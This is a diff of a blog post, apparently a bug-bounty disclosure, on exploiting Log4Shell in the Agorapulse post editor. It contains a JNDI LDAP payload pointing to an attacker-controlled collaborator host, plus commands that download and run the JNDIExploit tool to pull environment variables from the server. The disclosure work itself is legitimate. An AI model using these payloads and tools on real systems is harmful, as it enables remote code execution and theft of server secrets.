@@ -50,16 +50,18 @@ So the steps to reproduce were as follows
 - Start Burp and create a new burp collaborator Client
 - Now Login to agorapulse and click on `Publish` to publish a new post.
 
-![1.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/1.png)
+![x](/blog/assets/images/agora-log4j/1.png)
+
+
 
 - Now use your burp collaborator to make a new payload `${jndi:ldap://<Your-Burp-Collab-URL>/a}`, and paste it in the Post Section.
 - Now Select any profile from the left side and Publish the POST
 
-![2.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/2.png)
+![x](/blog/assets/images/agora-log4j/2.png)
 
 - On going back to burp collaborator Client you will see a Pingback on it
 
-![3.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/Three.png)
+![x](/blog/assets/images/agora-log4j/Three.png)
 
 
   
@@ -71,19 +73,19 @@ As mentioned in earlier sections the successful exploitation could lead to RCE. 
 - SSH to your Server
 
 
-```
+```console
 ssh user@<your-ip>
 ```
 
 - Download and Install JNDI Server
 
-```
+```console
 wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
 unzip JNDIExploit.v1.2.zip
 ```
 -Run the Exploit and you should see the following output on screen
 
-```
+```console
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <your-ip> -p 8888
 ```
 
@@ -95,7 +97,7 @@ As we went back to Agorapulse and make a another post with this Payload : `${jnd
 we were able just able to extract the environment variables of the server.
 
 
-![4.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/4.png)
+![x](/blog/assets/images/agora-log4j/4.png)
   
 
 We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical. And Hence no sensitive , Confidential or any information related to their users were extracted.
